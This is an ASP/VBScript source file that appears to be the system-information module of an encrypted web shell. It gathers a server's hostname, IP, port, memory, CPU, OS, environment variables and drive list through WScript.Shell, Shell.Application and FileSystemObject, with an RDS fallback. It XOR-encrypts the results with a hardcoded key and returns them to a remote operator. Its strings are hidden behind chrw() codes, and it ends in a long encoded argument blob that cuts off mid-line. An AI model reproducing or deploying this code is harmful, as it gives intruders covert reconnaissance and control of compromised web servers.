<%

dim basicInfo,driveList,currentPath,osInfo
currentPath=Server.MapPath(".")
osInfo=request.servervariables("os")

Function Encrypt(data)
k="e45e329feb5d925b"
size=len(data)
For i=1 To size
result=result&Chrb(asc(mid(data,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
Next
Encrypt=result
End Function

Function Base64Encode(sText)
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Base64Decode(ByVal vCode)
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function

'Stream_StringToBinary Function
'2003 Antonin Foller, http://www.motobit.com
'Text - string parameter To convert To binary data
Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1

  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save text/string data.
  BinaryStream.Type = adTypeText

  'Specify charset For the source text (unicode) data.
  BinaryStream.CharSet = "utf-8"

  'Open the stream And write text/string data To the object
  BinaryStream.Open
  BinaryStream.WriteText Text

  'Change stream type To binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary

  'Ignore first two bytes - sign of
  BinaryStream.Position = 0

  'Open the stream And get binary data from the object
  Stream_StringToBinary = BinaryStream.Read

  Set BinaryStream = Nothing
End Function

'Stream_BinaryToString Function
'2003 Antonin Foller, http://www.motobit.com
'Binary - VT_UI1 | VT_ARRAY data To convert To a string
Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1

  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary

  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.Write Binary

  'Change stream type To text/string
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText

  'Specify charset For the output text (unicode) data.
  BinaryStream.CharSet = "utf-8"

  'Open the stream And get text/string data from the object
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function
function DriveType(TP)
        select case TP
        Case 0:DriveType=chrw(26410)&chrw(30693)&chrw(30913)&chrw(30424)
        Case 1:DriveType=chrw(31227)&chrw(21160)&chrw(30913)&chrw(30424)
        Case 2:DriveType=chrw(26412)&chrw(22320)&chrw(30913)&chrw(30424)
        Case 3:DriveType=chrw(32593)&chrw(32476)&chrw(20849)&chrw(20139)
        Case 4:DriveType=chrw(20809)&chrw(-25999)
        Case 5:DriveType=chrw(82)&chrw(65)&chrw(77)&chrw(30913)&chrw(30424)
        end select
end function
Function GetFso()
        Dim Fso,Key
        Key="Scripting.FileSystemObject"
        Set Fso=CreateObject(Key)
        if IsEmpty(Fso) then Set Fso=Hfso
        if Not IsEmpty(Fso) then Set GetFso=Fso
        Set Fso=RDS(Key)
        Set GetFso=Fso
End Function
function GetSize(thesize)
        if thesize>=(1024^3) then GetSize=fix((thesize/(1024^3))*100)/100&"g"
        if thesize>=(1024^2) and thesize<(1024^3) then GetSize=fix((thesize /(1024^2))*100)/100&"m"
        if thesize>=1024 and thesize<(1024^2) then GetSize=fix((thesize/1024)*100)/100&"k"
        if thesize>=0 and thesize<1024 then GetSize=thesize&"b"
end function
sub echo(str)
        'response.Write(str)
        basicInfo=basicInfo&str
end sub
Function RDS(COM)
        Set r=CreateObject("RDS.DataSpace")
        Set RDS=r.CreateObject(COM,"")
End Function
Function GetWS()
        Dim WS,Key
        Key="WScript.Shell"
        Set WS=CreateObject(Key)
        if Not IsEmpty(WS) then Set GetWS=WS
        if IsEmpty(WS) then     Set WS=Hws
        Set WS=RDS(Key)
        Set GetWS=WS
End Function
Function GetSA()
        Dim SA,Key
        Key="shell.application"
        Set SA=CreateObject(Key)
        if IsEmpty(SA) then     Set SA=HSA
        if Not IsEmpty(SA) then Set GetSA=SA
        Set SA=RDS(Key)
        Set GetSA=SA
End Function
Sub main(arrArgs)
                on error resume next
                dim i,ws,Sa,sysenv,envlist,envlists,cpunum,cpuinfo,os
                envlists="SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
                envlist=split(envlists,"$")
                Set ws=GetWS()
                set sysenv=ws.environment("system")
                with request
                cpunum=.servervariables("number_of_processors")
                if isnull(cpunum) or cpunum="" then cpunum=sysenv("number_of_processors")
                os=.servervariables("os")
                if isnull(os) or os="" then     os=sysenv("os")&"("&chrw(26377)&chrw(21487)&chrw(-32515)&chrw(26159)&chrw(32)&chrw(119)&chrw(105)&chrw(110)&chrw(100)&chrw(111)&chrw(119)&chrw(115)&chrw(50)&chrw(48)&chrw(48)&chrw(51)&chrw(32)&chrw(21734)&")"
                cpuinfo=sysenv("processor_identifier")
                osInfo=os
                echo "<font color=red>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(30456)&chrw(20851)&chrw(21442)&chrw(25968)&":</font><hr>"
                echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(21517)&":"&.servervariables("server_name")&"</li>"
                echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&"ip:"&.servervariables("local_addr")&"</li>"
                echo "<li>"&chrw(26381)&chrw(21153)&chrw(31471)&chrw(21475)&":"&.servervariables("server_port")&"</li>"
                echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(20869)&chrw(23384)&":"&GetSize(GetSA().getsysteminformation("physicalmemoryinstalled"))&"</li>"
                echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(26102)&chrw(-27148)&":"&now&"</li>"
                echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(-28817)&chrw(20214)&":"&.servervariables("server_software")&"</li>"
                echo "<li>"&chrw(-32486)&chrw(26412)&chrw(-29307)&chrw(26102)&chrw(26102)&chrw(-27148)&":"&server.scripttimeout&"</li>"
                echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(99)&chrw(112)&chrw(117)&chrw(25968)&chrw(-28209)&":"&cpunum&"</li>"
                echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(99)&chrw(112)&chrw(117)&chrw(-29722)&chrw(24773)&":"&cpuinfo&"</li>"
                echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(25805)&chrw(20316)&chrw(31995)&chrw(32479)&":"&os&"</li>"
                echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(-30237)&chrw(-29743)&chrw(24341)&chrw(25806)&":"&scriptengine&"/"&scriptenginemajorversion&"."&scriptengineminorversion&"."&scriptenginebuildversion&"</li>"
                echo "<li>"&chrw(26412)&chrw(25991)&chrw(20214)&chrw(23454)&chrw(-27067)&chrw(-29201)&chrw(24452)&":"&.servervariables("path_translated")&"</li>"
                end with
                for i=0 to ubound(envlist)
                        echo "<li>"&envlist(i)&": "&ws.expandenvironmentstrings("%"&envlist(i)&"%")&"</li>"
                next
                set ws=nothing
                set sysenv=nothing
                Dim TheDrive,Fso
                set Fso=GetFso()
                echo "<hr><font color=red>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(30913)&chrw(30424)&chrw(20449)&chrw(24687)&"</font>:"
                echo "<table><tr bgcolor=green><td>"&chrw(30424)&chrw(31526)&"</td><td>"&chrw(31867)&chrw(22411)&"</td><td>"&chrw(21367)&chrw(26631)&"</td><td>"&chrw(25991)&chrw(20214)&chrw(31995)&chrw(32479)&"</td><td>"&chrw(21487)&chrw(29992)&chrw(31354)&chrw(-27148)&"</td><td>"&chrw(24635)&chrw(31354)&chrw(-27148)&"</td></tr>"
                For Each TheDrive In Fso.Drives
                        with TheDrive
                        driveList=driveList&.DriveLetter&":/;"
                        echo "<tr><td bgcolor=green>"&.DriveLetter&"</td>"
                        echo "<td>"&DriveType(.DriveType)&"</td>"
                        If Not UCase(.DriveLetter)="A" Then
                                echo "<td>"&.VolumeName&"</td>"
                                echo "<td>"&.FileSystem&"</td>"
                                echo "<td>"&GetSize(.FreeSpace)&"</td>"
                                echo "<td>"&GetSize(.TotalSize)&"</td>"
                        End If
                        end with
                        If Err Then Err.Clear
                Next
                echo "</table><hr><br/>"
                Set TheDrive=Nothing
                Set Fso=Nothing
                finalResult="{""basicInfo"":"""&Base64Encode(basicInfo)&""",""driveList"":"""&Base64Encode(driveList)&""",""arch"":""IA=="",""currentPath"":"""&Base64Encode(currentPath)&""",""osInfo"":"""&Base64Encode(osInfo)&"""}"
                finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(finalResult)&"""}"
                Response.binarywrite(Encrypt(finalResult))
                'Response.write(finalResult)
End Sub

main Array(chrw(112)&chrw(110)&chrw(81)&chrw(113)&chrw(79)&chrw(102)&chrw(70)&chrw(109)&chrw(119)&chrw(98)&chrw(111)&chrw(104)&chrw(48)&chrw(77)&chrw(70)&chrw(57)&chrw(101)&chrw(101)&chrw(75)&chrw(105)&chrw(78)&chrw(84)&chrw(111)&chrw(50)&chrw(102)&chrw(82)&chrw(49)&chrw(113)&chrw(101)&chrw(103)&chrw(57)&chrw(108)&chrw(57)&chrw(116)&chrw(81)&chrw(67)&chrw(120)&chrw(107)&chrw(104)&chrw(73)&chrw(87)&chrw(88)&chrw(75)&chrw(101)&chrw(108)&chrw(107)&chrw(76)&chrw(108)&chrw(80)&chrw(121)&chrw(107)&chrw(77)&chrw(77)&chrw(49)&chrw(108)&chrw(56)&chrw(110)&chrw(54)&chrw(108)&chrw(111)&chrw(73)&chrw(54)&chrw(118)&chrw(72)&chrw(86)&chrw(75)&chrw(75)&chrw(78)&chrw(113)&chrw(80)&chrw(86)&chrw(79)&chrw(55)&chrw(122)&chrw(117)&chrw(67)&chrw(54)&chrw(117)&chrw(110)&chrw(90)&chrw(88)&chrw(83)&chrw(110)&chrw(50)&chrw(89)&chrw(85)&chrw(70)&chrw(120)&chrw(78)&chrw(98)&chrw(103)&chrw(98)&chrw(107)&chrw(106)&chrw(107)&chrw(76)&chrw(79)&chrw(121)&chrw(74)&chrw(111)&chrw(100)&chrw(101)&chrw(100)&chrw(55)&chrw(53)&chrw(84)&chrw(85)&chrw(48)&chrw(86)&chrw(98)&chrw(98)&chrw(102)&chrw(120)&chrw(81)&chrw(104)&chrw(122)&chrw(68)&chrw(87)&chrw(109)&chrw(51)&chrw(100)&chrw(108)&chrw(56)&chrw(52)&chrw(103)&chrw(107)&chrw(85)&chrw(80)&chrw(48)&chrw(109)&chrw(110)&chrw(106)&chrw(112)&chrw(51)&chrw(113)&chrw(49)&chrw(97)&chrw(54)&chrw(116)&chrw(68)&chrw(109)&chrw(84)&chrw(48)&chrw(101)&chrw(72)&chrw(110)&chrw(113)&chrw(109)&chrw(57)&chrw(57)&chrw(73)&chrw(122)&chrw(89)&chrw(79)&chrw(80)&chrw(119)&chrw(76)&chrw(108)&chrw(72)&chrw(100)&chrw(80)&chrw(49)&chrw(66)&chrw(112)&chrw(65)&chrw(79)&chrw(72)&chrw(97)&chrw(52)&chrw(53)&chrw(81)&chrw(114)&chrw(103)&chrw(55)&chrw(97)&chrw(57)&chrw(98)&chrw(98)&chrw(108)&chrw(48)&chrw(55)&chrw(84)&chrw(118)&chrw(114)&chrw(83)&chrw(90)&chrw(84)&chrw(52)&chrw(57)&chrw(87)&chrw(102)&chrw(101)&chrw(72)&chrw(107)&chrw(80)&chrw(88)&chrw(122)&chrw(108)&chrw(54)&chrw(65)&chrw(86)&chrw(97)&chrw(68)&chrw(113)&chrw(52)&chrw(90)&chrw(99)&chrw(82)&chrw(74)&chrw(90)&chrw(102)&chrw(117)&chrw(75)&chrw(56)&chrw(82)&chrw(48)&chrw(106)&chrw(73)&chrw(69)&chrw(71)&chrw(118)&chrw(78)&chrw(106)&chrw(54)&chrw(56)&chrw(50)&chrw(86)&chrw(111)&chrw(81)&chrw(119)&chrw(78)&chrw(110)&chrw(116)&chrw(121)&chrw(72)&chrw(120)&chrw(67)&chrw(100)&chrw(118)&chrw(115)&chrw(88)&chrw(97)&chrw(103)&chrw(101)&chrw(65)&chrw(53)&chrw(48)&chrw(69)&chrw(49)&chrw(54)&chrw(49)&chrw(76)&chrw(68)&chrw(105)&chrw(66)&chrw(72)&chrw(117)&chrw(108)&chrw(55)&chrw(108)&chrw(56)&chrw(74)&chrw(48)&chrw(71)&chrw(122)&chrw(88)&chrw(71)&chrw(65)&chrw(79)&chrw(75)&chrw(108)&chrw(97)&chrw(106)&chrw(104)&chrw(101)&chrw(81)&chrw(118)&chrw(74)&chrw(112)&chrw(82)&chrw(83)&chrw(107)&chrw(90)&chrw(77)&chrw(75)&chrw(75)&chrw(68)&chrw(102)&chrw(104)&chrw(87)&chrw(74)&chrw(73)&chrw(72)&chrw(57)&chrw(97)&chrw(103)&chrw(116)&chrw(116)&chrw(69)&chrw(86)&chrw(86)&chrw(108)&chrw(117)&chrw(105)&chrw(113)&chrw(106)&chrw(121)&chrw(51)&chrw(101)&chrw(89)&chrw(98)&chrw(70)&chrw(114)&chrw(52)&chrw(52)&chrw(102)&chrw(55)&chrw(97)&chrw(90)&chrw(49)&chrw(79)&chrw(85)&chrw(90)&chrw(49)&chrw(50)&chrw(85)&chrw(79)&chrw(76)&chrw(121)&chrw(56)&chrw(120)&chrw(79)&chrw(116)&chrw(77)&chrw(67)&chrw(103)&chrw(119)&chrw(115)&chrw(49)&chrw(113)&chrw(74)&chrw(112)&chrw(70)&chrw(107)&chrw(119)&chrw(49)&chrw(109)&chrw(68)&chrw(78)&chrw(117)&chrw(51)&chrw(120)&chrw(113)&chrw(86)&chrw(117)&chrw(53)&chrw(117)&chrw(67)&chrw(75)&chrw(101)&chrw(56)&chrw(83)&chrw(74)&chrw(82)&chrw(89)&chrw(113)&chrw(83)&chrw(79)&chrw(111)&chrw(72)&chrw(53)&chrw(97)&chrw(111)&chrw(122)&chrw(87)&chrw(112)&chrw(121)&chrw(79)&chrw(74)&chrw(119)&chrw(57)&chrw(84)&chrw(80)&chrw(104)&chrw(106)&chrw(52)&chrw(86)&chrw(69)&chrw(83)&chrw(49)&chrw(76)&chrw(111)&chrw(97)&chrw(56)&chrw(89)&chrw(101)&chrw(108)&chrw(55)&chrw(81)&chrw(118)&chrw(105)&chrw(76)&chrw(55)&chrw(75)&chrw(103)&chrw(113)&chrw(104)&chrw(84)&chrw(73)&chrw(97)&chrw(55)&chrw(122)&chrw(111)&chrw(50)&chrw(115)&chrw(69)&chrw(119)&chrw(74)&chrw(108)&chrw(65)&chrw(110)&chrw(55)&chrw(80)&chrw(105)&chrw(111)&chrw(50)&chrw(68)&chrw(114)&chrw(79)&chrw(101)&chrw(52)&chrw(51)&chrw(107)&chrw(106)&chrw(77)&chrw(67)&chrw(74)&chrw(74)&chrw(48)&chrw(75)&chrw(99)&chrw(111)&chrw(121)&chrw(88)&chrw(49)&chrw(76)&chrw(77)&chrw(105)&chrw(87)&chrw(104)&chrw(67)&chrw(84)&chrw(105)&chrw(100)&chrw(71)&chrw(115)&chrw(104)&chrw(98)&chrw(82)&chrw(109)&chrw(73)&chrw(118)&chrw(56)&chrw(103)&chrw(86)&chrw(102)&chrw(79)&chrw(72)&chrw(101)&chrw(110)&chrw(56)&chrw(73)&chrw(98)&chrw(97)&chrw(90)&chrw(114)&chrw(102)&chrw(110)&chrw(104)&chrw(57)&chrw(114)&chrw(73)&chrw(121)&chrw(56)&chrw(50)&chrw(116)&chrw(49)&chrw(73)&chrw(69)&chrw(71)&chrw(88)&chrw(84)&chrw(49)&chrw(80)&chrw(71)&chrw(119)&chrw(70)&chrw(54)&chrw(68)&chrw(98)&chrw(80)&chrw(48)&chrw(86)&chrw(110)&chrw(69)&chrw(70)&chrw(75)&chrw(52)&chrw(104)&chrw(69)&chrw(73)&chrw(108)&chrw(69)&chrw(65)&chrw(104)&chrw(56)&chrw(83)&chrw(66)&chrw(99)&chrw(111)&chrw(120)&chrw(97)&chrw(116)&chrw(101)&chrw(111)&chrw(72)&chrw(107)&chrw(52)&chrw(112)&chrw(71)&chrw(111)&chrw(78)&chrw(119)&chrw(52)&chrw(88)&chrw(112)&chrw(100)&chrw(81)&chrw(54)&chrw(101)&chrw(75)&chrw(110)&chrw(122)&chrw(49)&chrw(51)&chrw(54)&chrw(56)&chrw(77)&chrw(102)&chrw(74)&chrw(48)&chrw(55)&chrw(99)&chrw(48)&chrw(76)&chrw(112)&chrw(86)&chrw(78)&chrw(98)&chrw(75)&chrw(121)&chrw(86)&chrw(87)&chrw(115)&chrw(99)&chrw(108)&chrw(49)&chrw(104)&chrw(77)&chrw(105)&chrw(56)&chrw(67)&chrw(72)&chrw(68)&chrw(99)&chrw(56)&chrw(48)&chrw(89)&chrw(77)&chrw(85)&chrw(74)&chrw(67)&chrw(122)&chrw(88)&chrw(114)&chrw(103)&chrw(52)&chrw(117)&chrw(80)&chrw(55)&chrw(82)&chrw(73)&chrw(119)&chrw(87)&chrw(104)&chrw(69)&chrw(82)&chrw(112)&chrw(70)&chrw(90)&chrw(86)&chrw(52)&chrw(48)&chrw(120)&chrw(48)&chrw(116)&chrw(108)&chrw(88)&chrw(74)&chrw(122)&chrw(87)&chrw(70)&chrw(98)&chrw(52)&chrw(90)&chrw(119)&chrw(121)&chrw(98)&chrw(101)&chrw(99)&chrw(110)&chrw(109)&chrw(50)&chrw(104)&chrw(77)&chrw(48)&chrw(79)&chrw(78)&chrw(98)&chrw(68)&chrw(65)&chrw(103)&chrw(119)&chrw(53)&chrw(110)&chrw(82)&chrw(103)&chrw(108)&chrw(79)&chrw(85)&chrw(105)&chrw(104)&chrw(112)&chrw(48)&chrw(90)&chrw(115)&chrw(102)&chrw(90)&chrw(55)&chrw(52)&chrw(75)&chrw(99)&chrw(56)&chrw(78)&chrw(86)&chrw(88)&chrw(72)&chrw(55)&chrw(89)&chrw(72)&chrw(98)&chrw(82)&chrw(68)&chrw(87)&chrw(82)&chrw(69)&chrw(57)&chrw(121)&chrw(49)&chrw(101)&chrw(118)&chrw(120)&chrw(74)&chrw(85)&chrw(66)&chrw(53)&chrw(115)&chrw(80)&chrw(77)&chrw(56)&chrw(97)&chrw(50)&chrw(66)&chrw(111)&chrw(98)&chrw(56)&chrw(79)&chrw(73)&chrw(53)&chrw(113)&chrw(86)&chrw(75)&chrw(117)&chrw(120)&chrw(119)&chrw(70)&chrw(81)&chrw(112)&chrw(68)&chrw(86)&chrw(71)&chrw(54)&chrw(53)&chrw(97)&chrw(81)&chrw(69)&chrw(107)&chrw(110)&chrw(89)&chrw(78)&chrw(99)&chrw(66)&chrw(52)&chrw(87)&chrw(118)&chrw(68)&chrw(70)&chrw(113)&chrw(78)&chrw(97)&chrw(121)&chrw(81)&chrw(66)&chrw(102)&chrw(78)&chrw(51)&chrw(112)&chrw(75)&chrw(48)&chrw(114)&chrw(69)&chrw(54)&chrw(114)&chrw(110)&chrw(121)&chrw(87)&chrw(118)&chrw(105)&chrw(97)&chrw(67)&chrw(75)&chrw(50)&chrw(88)&chrw(80)&chrw(101)&chrw(50)&chrw(120)&chrw(80)&chrw(68)&chrw(66)&chrw(68)&chrw(101)&chrw(121)&chrw(52)&chrw(122)&chrw(68)&chrw(68)&chrw(87)&chrw(48)&chrw(118)&chrw(113)&chrw(88)&chrw(105)&chrw(70)&chrw(51)&chrw(122)&chrw(65)&chrw(54)&chrw(113)&chrw(101)&chrw(56)&chrw(49)&chrw(48)&chrw(78)&chrw(48)&chrw(115)&chrw(56)&chrw(114)&chrw(68)&chrw(102)&chrw(71)&chrw(83)&chrw(116)&chrw(114)&chrw(106)&chrw(120)&chrw(109)&chrw(68)&chrw(111)&chrw(107)&chrw(121)&chrw(121)&chrw(71)&chrw(76)&chrw(84)&chrw(97)&chrw(85)&chrw(48)&chrw(81)&chrw(72)&chrw(110)&chrw(110)&chrw(76)&chrw(81)&chrw(72)&chrw(79)&chrw(108)&chrw(103)&chrw(55)&chrw(115)&chrw(111)&chrw(113)&chrw(112)&chrw(108)&chrw(51)&chrw(55)&chrw(107)&chrw(70)&chrw(79)&chrw(114)&chrw(84)&chrw(54)&chrw(117)&chrw(76)&chrw(98)&chrw(79)&chrw(50)&chrw(76)&chrw(121)&chrw(66)&chrw(52)&chrw(76)&chrw(54)&chrw(52)&chrw(73)&chrw(49)&chrw(100)&chrw(106)&chrw(68)&chrw(65)&chrw(84)&chrw(107)&chrw(107)&chrw(49)&chrw(105)&chrw(78)&chrw(120)&chrw(77)&chrw(75)&chrw(104)&chrw(67)&chrw(73)&chrw(85)&chrw(53)&chrw(77)&chrw(50)&chrw(55)&chrw(52)&chrw(52)&chrw(105)&chrw(117)&chrw(87)&chrw(89)&chrw(85)&chrw(114)&chrw(81)&chrw(118)&chrw(52)&chrw(82)&chrw(111)&chrw(73)&chrw(97)&chrw(118)&chrw(75)&chrw(51)&chrw(112)&chrw(65)&chrw(102)&chrw(87)&chrw(75)&chrw(120)&chrw(97)&chrw(51)&chrw(80)&chrw(111)&chrw(113)&chrw(52)&chrw(87)&chrw(120)&chrw(70)&chrw(90)&chrw(80)&chrw(78)&chrw(102)&chrw(55)&chrw(56)&chrw(103)&chrw(100)&chrw(54)&chrw(56)&chrw(79)&chrw(116)&chrw(97)&chrw(89)&chrw(98)&chrw(119)&chrw(116)&chrw(97)&chrw(66)&chrw(114)&chrw(100)&chrw(76)&chrw(103)&chrw(80)&chrw(74)&chrw(68)&chrw(75)&chrw(77)&chrw(115)&chrw(79)&chrw(88)&chrw(69)&chrw(105)&chrw(79)&chrw(71)&chrw(69)&chrw(115)&chrw(104)&chrw(73)&chrw(103)&chrw(66)&chrw(107)&chrw(84)&chrw(99)&chrw(73)&chrw(77)&chrw(109)&chrw(108)&chrw(86)&chrw(111)&chrw(85)&chrw(49)&chrw(75)&chrw(79)&chrw(67)&chrw(108)&chrw(73)&chrw(69)&chrw(116)&chrw(116)&chrw(90)&chrw(85)&chrw(107)&chrw(107)&chrw(114)&chrw(49)&chrw(52)&chrw(104)&chrw(86)&chrw(73)&chrw(86)&chrw(105)&chrw(97)&chrw(103)&chrw(114)&chrw(105)&chrw(81)&chrw(90)&chrw(85)&chrw(114)&chrw(72)&chrw(79)&chrw(98)&chrw(85)&chrw(76)&chrw(98)&chrw(55)&chrw(70)&chrw(76)&chrw(77)&chrw(104)&chrw(79)&chrw(52)&chrw(115)&chrw(99)&chrw(86)&chrw(112)&chrw(71)&chrw(89)&chrw(88)&chrw(71)&chrw(107)&chrw(117)&chrw(97)&chrw(86)&chrw(74)&chrw(104)&chrw(57)&chrw(53)&chrw(118)&chrw(122)&chrw(119)&chrw(53)&chrw(76)&chrw(118)&chrw(89)&chrw(90)&chrw(119)&chrw(73)&chrw(67)&chrw(112)&chrw(110)&chrw(102)&chrw(53)&chrw(104)&chrw(87)&chrw(70)&chrw(115)&chrw(120)&chrw(74)&chrw(49)&chrw(117)&chrw(109)&chrw(57)&chrw(55)&chrw(86)&chrw(74)&chrw(67)&chrw(79)&chrw(80)&chrw(119)&chrw(117)&chrw(57)&chrw(119)&chrw(84)&chrw(52)&chrw(79)&chrw(114)&chrw(56)&chrw(97)&chrw(98)&chrw(67)&chrw(77)&chrw(89)&chrw(65)&chrw(48)&chrw(101)&chrw(69)&chrw(98)&chrw(81)&chrw(78)&chrw(50)&chrw(70)&chrw(115)&chrw(52)&chrw(108)&chrw(51)&chrw(54)&chrw(71)&chrw(51)&chrw(52)&chrw(108)&chrw(57)&chrw(98)&chrw(109)&chrw(70)&chrw(77)&chrw(119)&chrw(65)&chrw(49)&chrw(87)&chrw(114)&chrw(105)&chrw(56)&chrw(89)&chrw(55)&chrw(116)&chrw(72)&chrw(85)&chrw(86)&chrw(105)&chrw(65)&chrw(100)&chrw(74)&chrw(119)&chrw(78)&chrw(103)&chrw(103)&chrw(79)&chrw(85)&chrw(76)&chrw(72)&chrw(75)&chrw(101)&chrw(97)&chrw(69)&chrw(107)&chrw(97)&chrw(70)&chrw(118)&chrw(113)&chrw(97)&chrw(75)&chrw(112)&chrw(68)&chrw(66)&chrw(54)&chrw(54)&chrw(108)&chrw(84)&chrw(79)&chrw(82)&chrw(56)&chrw(110)&chrw(69)&chrw(73)&chrw(76)&chrw(80)&chrw(117)&chrw(109)&chrw(121)&chrw(118)&chrw(102)&chrw(110)&chrw(75)&chrw(87)&chrw(116)&chrw(88)&chrw(68)&chrw(66)&chrw(57)&chrw(57)&chrw(117)&chrw(48)&chrw(72)&chrw(106)&chrw(105)&chrw(100)&chrw(53)&chrw(69)&chrw(66)&chrw(97)&chrw(89)&chrw(56)&chrw(49)&chrw(111)&chrw(74)&chrw(99)&chrw(86)&chrw(53)&chrw(86)&chrw(99)&chrw(82)&chrw(56)&chrw(97)&chrw(75)&chrw(57)&chrw(105)&chrw(70)&chrw(74)&chrw(88)&chrw(70)&chrw(56)&chrw(66)&chrw(103)&chrw(48)&chrw(70)&chrw(72)&chrw(56)&chrw(110)&chrw(48)&chrw(69)&chrw(100)&chrw(87)&chrw(109)&chrw(116)&chrw(70)&chrw(116)&chrw(103)&chrw(104)&chrw(110)&chrw(66)&chrw(84)&chrw(83)&chrw(54)&chrw(99)&chrw(116)&chrw(105)&chrw(80)&chrw(97)&chrw(76)&chrw(97)&chrw(65)&chrw(114)&chrw(97)&chrw(78)&chrw(100)&chrw(52)&chrw(113)&chrw(98)&chrw(98)&chrw(79)&chrw(51)&chrw(75)&chrw(104)&chrw(72)&chrw(107)&chrw(79)&chrw(115)&chrw(57)&chrw(83)&chrw(120)&chrw(98)&chrw(81)&chrw(48)&chrw(87)&chrw(105)&chrw(57)&chrw(107)&chrw(115)&chrw(68)&chrw(107)&chrw(88)&chrw(54)&chrw(105)&chrw(122)&chrw(99)&chrw(122)&chrw(103)&chrw(71)&chrw(84)&chrw(77)&chrw(56)&chrw(55)&chrw(115)&chrw(80)&chrw(100)&chrw(53)&chrw(66)&chrw(113)&chrw(69)&chrw(102)&chrw(79)&chrw(49)&chrw(97)&chrw(57)&chrw(110)&chrw(78)&chrw(107)&chrw(121)&chrw(53)&chrw(55)&chrw(55)&chrw(77)&chrw(102)&chrw(79)&chrw(80)&chrw(111)&chrw(88)&chrw(80)&chrw(72)&chrw(71)&chrw(69)&chrw(85)&chrw(119)&chrw(116)&chrw(73)&chrw(77)&chrw(80)&chrw(84)&chrw(56)&chrw(116)&chrw(54)&chrw(121)&chrw(54)&chrw(85)&chrw(76)&chrw(106)&chrw(118)&chrw(51)&chrw(84)&chrw(78)&chrw(115)&chrw(88)&chrw(89)&chrw(90)&chrw(108)&chrw(85)&chrw(113)&chrw(107)&chrw(79)&chrw(114)&chrw(85)&chrw(103)&chrw(53)&chrw(100)&chrw(116)&chrw(122)&chrw(119)&chrw(73)&chrw(111)&chrw(115)&chrw(118)&chrw(74)&chrw(111)&chrw(100)&chrw(54)&chrw(117)&chrw(49)&chrw(80)&chrw(97)&chrw(89)&chrw(80)&chrw(81)&chrw(104)&chrw(116)&chrw(71)&chrw(68)&chrw(89)&chrw(65)&chrw(106)&chrw(49)&chrw(57)&chrw(106)&chrw(81)&chrw(110)&chrw(104)&chrw(72)&chrw(65)&chrw(113)&chrw(72)&chrw(69)&chrw(53)&chrw(105)&chrw(56)&chrw(83)&chrw(110)&chrw(74)&chrw(100)&chrw(103)&chrw(105)&chrw(78)&chrw(48)&chrw(122)&chrw(83)&chrw(50)&chrw(121)&chrw(77)&chrw(99)&chrw(119)&chrw(90)&chrw(109)&chrw(122)&chrw(88)&chrw(111)&chrw(118)&chrw(53)&chrw(70)&chrw(106)&chrw(80)&chrw(55)&chrw(85)&chrw(110)&chrw(77)&chrw(84)&chrw(122)&chrw(105)&chrw(119)&chrw(86)&chrw(52)&chrw(83)&chrw(88)&chrw(97)&chrw(117)&chrw(57)&chrw(71)&chrw(56)&chrw(65)&chrw(83)&chrw(48)&chrw(78)&chrw(67)&chrw(121)&chrw(104)&chrw(87)&chrw(69)&chrw(65)&chrw(103)&chrw(122)&chrw(103)&chrw(108)&chrw(54)&chrw(111)&chrw(79)&chrw(50)&chrw(84)&chrw(67)&chrw(88)&chrw(73)&chrw(89)&chrw(110)&chrw(108)&chrw(86)&chrw(75)&chrw(85)&chrw(113)&chrw(109)&chrw(100)&chrw(87)&chrw(101)&chrw(113)&chrw(115)&chrw(71)&chrw(112)&chrw(90)&chrw(82)&chrw(78)&chrw(104)&chrw(52)&chrw(74)&chrw(100)&chrw(73)&chrw(57)&chrw(98)&chrw(114)&chrw(74)&chrw(101)&chrw(70)&chrw(104)&chrw(70)&chrw(90)&chrw(55)&chrw(78)&chrw(114)&chrw(98)&chrw(115)&chrw(114)&chrw(57)&chrw(117)&chrw(66)&chrw(90)&chrw(121)&chrw(104)&chrw(118)&chrw(101)&chrw(65)&chrw(55)&chrw(97)&chrw(103)&chrw(52)&chrw(113)&chrw(66)&chrw(49)&chrw(112)&chrw(109)&chrw(50)&chrw(86)&chrw(115)&chrw(81)&chrw(86)&chrw(85)&chrw(120)&chrw(121)&chrw(114)&chrw(111)&chrw(105)&chrw(104)&chrw(51)&chrw(119)&c